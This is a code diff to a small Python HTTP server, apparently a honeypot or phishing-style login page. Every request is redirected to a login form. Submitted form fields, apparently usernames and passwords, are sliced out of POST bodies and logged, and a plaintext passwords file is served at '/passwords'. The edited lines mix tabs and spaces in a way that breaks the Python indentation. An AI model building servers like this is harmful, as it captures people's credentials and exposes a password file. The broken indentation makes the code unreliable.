@@ -25,16 +25,12 @@ class HTTPHandler(SimpleHTTPRequestHandler):
 		self.end_headers()
 
 	def do_GET(self):
-			print(self.client_address)
+			http_get_logger.info(f'{self.client_address}')
 			if self.path == '/passwords':
 				self.path = '/passwords.txt'
 				return SimpleHTTPRequestHandler.do_GET(self)
-			elif self.path == '/login':
-				self.path = '/login.html'
-				return SimpleHTTPRequestHandler.do_GET(self)
-
 			else:
-				self.path = '/index.html'
+				self.path = '/login.html'
 				return SimpleHTTPRequestHandler.do_GET(self)
 
 
@@ -43,15 +39,11 @@ class HTTPHandler(SimpleHTTPRequestHandler):
 	def do_POST(self):
 		content_length = int(self.headers.get('Content-Length', 0))
 		config_string = self.rfile.read(content_length).decode("UTF-8")
-
-		if self.path == '/login/':
-			self.path = '/login.html'
-
-            index1 = config_string.find('=')
-			index2 = config_string.find('&')
-			index3 = config_string.rfind('&')
-			http_get_logger.info(f'{config_string[index1+1:index2]}\t{config_string[index2+10:index3]}')
-		self.path='/login.html'
+        self.path = '/login.html'
+        index1 = config_string.find('=')
+		index2 = config_string.find('&')
+		index3 = config_string.rfind('&')
+		http_get_logger.info(f'{config_string[index1+1:index2]}\t{config_string[index2+10:index3]}')
 		return SimpleHTTPRequestHandler.do_GET(self)
 
 
